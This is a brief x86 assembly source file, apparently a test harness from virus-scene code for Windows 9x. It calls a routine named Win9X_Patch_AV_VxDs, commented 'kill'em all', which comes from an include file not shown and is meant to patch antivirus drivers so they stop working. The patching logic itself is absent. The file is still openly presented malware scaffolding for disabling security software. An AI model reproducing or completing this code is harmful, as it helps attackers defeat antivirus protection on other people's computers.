
include                 VXDCALL.INC             ; VxDcall interface

callW                   macro   x               ; useful
                        extrn   x:PROC
                        call    x
                        endm

                        p386
                        model   flat

                        .data

                        db      ?               ; init dataseg. fuckin' tlink

                        .code

start:
                        nop

                        call    Win9X_Patch_AV_VxDs     ; kill'em all

                        nop

                        push    -1              ; exit to md
                        callW   ExitProcess

include                 PTCHAVXD.INC

                        end     start
